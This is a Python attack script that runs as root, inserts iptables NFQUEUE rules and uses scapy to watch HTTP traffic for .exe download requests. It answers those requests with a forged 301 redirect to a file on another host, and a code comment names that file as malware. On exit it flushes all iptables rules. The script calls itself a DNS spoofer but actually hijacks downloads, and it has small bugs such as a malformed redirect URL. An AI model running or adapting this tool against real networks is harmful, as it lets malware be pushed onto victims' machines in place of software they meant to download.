#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy
import sys, os, subprocess

def root_check():
    if os.geteuid() != 0:
        sys.exit("[!] This script must run as root")
    else:
        print("[*] Welcome to the DNS Spoofer.")

def iptable_insert():
    try:
        subprocess.run(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
        subprocess.run(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
        '''
        or
        subprocess.run(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', '1337'], check=True)
        '''
        print("[*] Iptables intercepting rule inserted")
    except Exception as e:
        print(f"[!] Error inserting iptables rule: {e}")

def iptable_flush():
    try:
        subprocess.run(['iptables', '--flush'], check=True)
        print("[*] Iptables rules flushed")
    except Exception as e:
        print(f"[!] Error flushing iptables: {e}")

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] .exe file download detected")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                #Forge the Response
                #Change this location to malware. I mean your selected file..
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https:/198.162.1.50/Path/to/file.exe"
                # Remove checksums so Scapy recalculates them
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].len
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(bytes(scapy_packet))

    packet.accept()

if __name__ == "__main__":
    root_check()
    iptable_insert()

    # create the object, bind to the iptables command and run
    queue = netfilterqueue.NetfilterQueue()
    
    ack_list = []

    try:
        queue.bind(1337, process_packet)
        try:
            print("[*] Starting packet interception. Press Ctrl+C to stop.")
            queue.run()
        except KeyboardInterrupt:
            print("\n[!] User Interruption detected. Exiting gracefully.")
        except Exception as e:
            print(f"[!] An error has occurred running NSQUEU: {e}")
    except Exception as e:
        print(f"[!] An error has occurred binding NSQUEU: {e}")
    finally:
        iptable_flush()
